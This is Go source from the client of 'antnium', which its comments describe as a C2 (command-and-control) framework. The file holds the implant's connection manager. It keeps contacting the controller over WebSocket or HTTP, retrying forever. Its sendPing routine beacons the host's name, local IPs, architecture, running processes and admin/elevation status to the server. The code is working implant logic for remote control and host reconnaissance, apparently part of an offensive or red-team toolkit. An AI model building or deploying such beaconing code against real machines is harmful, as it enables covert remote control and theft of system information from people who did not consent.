package client

import (
	"strconv"
	"time"

	"github.com/dobin/antnium/pkg/arch"
	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/model"

	log "github.com/sirupsen/logrus"
)

// Upstreammanger provides a connection to the server via Channel
type UpstreamManager struct {
	Channel chan model.Packet

	config   *ClientConfig
	campaign *campaign.Campaign

	UpstreamRest Upstream
	UpstreamWs   Upstream

	reconnectTimer *SleepTimer
}

func MakeUpstreamManager(config *ClientConfig, campaign *campaign.Campaign) UpstreamManager {
	upstreamRest := MakeUpstreamRest(config, campaign)
	upstreamWs := MakeUpstreamWs(config, campaign)
	reconnectTimer := MakeSleepTimer()

	u := UpstreamManager{
		Channel:        make(chan model.Packet),
		config:         config,
		campaign:       campaign,
		UpstreamRest:   &upstreamRest,
		UpstreamWs:     &upstreamWs,
		reconnectTimer: &reconnectTimer,
	}
	return u
}

// Connect will try until the C2 can be reached via a upstream.
func (d *UpstreamManager) Connect() {
	// Loop which retrieves packets from the active upstream and sends it to client
	var packet model.Packet
	var connected bool
	go func() {
		for {
			// We dont care which upstream we are connected to
			select {
			case packet, connected = <-d.UpstreamWs.ChanIncoming():
				if !connected {
					d.ReconnectWebsocket() // Blocks until we can reach server again
					continue               // We are connected again, do as before
				}
			case packet, connected = <-d.UpstreamRest.ChanIncoming():
				// No reconnect handling atm
			}

			// Send the packet to client
			d.Channel <- packet
		}
	}()

	d.ConnectRetryForever()
}

// ConnectRetryForever will try to connect to the server, forever. Then starts upstreams
func (d *UpstreamManager) ConnectRetryForever() error {
	d.reconnectTimer.tick()
	for {
		if d.campaign.ClientUseWebsocket {
			// Try: Websocket
			err := d.UpstreamWs.Connect()
			if err == nil {
				log.Infof("Connected to WS")
				d.UpstreamWs.Start()
				d.sendPing()
				break
			}
		} else {
			err := d.UpstreamRest.Connect()
			if err == nil {
				log.Infof("Connected to HTTP")
				d.UpstreamRest.Start()
				d.sendPing()
				break
			}
		}

		log.Debug("Could not connect, sleeping...")
		time.Sleep(d.reconnectTimer.getSleepDuration())
	}

	return nil
}

// Reconnect will destroy the currect WS upstream, and block until connected again
func (d *UpstreamManager) ReconnectWebsocket() {
	// Throw away old UpstreamWs, and try to connect again
	upstreamWs := MakeUpstreamWs(d.config, d.campaign)
	d.UpstreamWs = &upstreamWs
	log.Infof("Upstream websocket disconnectd. Retrying...")
	d.ConnectRetryForever()
}

// SendOutofBand will send a packet to the server according to a connected upstream
func (d *UpstreamManager) DoOutgoingPacket(packet model.Packet) error {
	for {
		if d.UpstreamWs.Connected() {
			d.UpstreamWs.ChanOutgoing() <- packet
			break
		} else if d.UpstreamRest.Connected() {
			d.UpstreamRest.ChanOutgoing() <- packet
			break
		} else {
			log.Warn("OOB: No active upstreams, sleep and try again")
			time.Sleep(time.Second * 3)
		}
	}

	return nil
}

// sendPing will send a ping message to the server
func (d *UpstreamManager) sendPing() {
	arguments := make(model.PacketArgument)

	response := make(model.PacketResponse)
	response["hostname"] = d.config.Hostname
	model.AddArrayToResponse("localIp", d.config.LocalIps, response)
	response["arch"] = d.config.Arch
	model.AddArrayToResponse("processes", d.config.Processes, response)
	isElevated, isAdmin, err := arch.GetPermissions()
	if err == nil {
		response["isElevated"] = strconv.FormatBool(isElevated)
		response["isAdmin"] = strconv.FormatBool(isAdmin)
	}

	packet := d.config.MakeClientPacket("ping", arguments, response)
	d.DoOutgoingPacket(*packet)
}
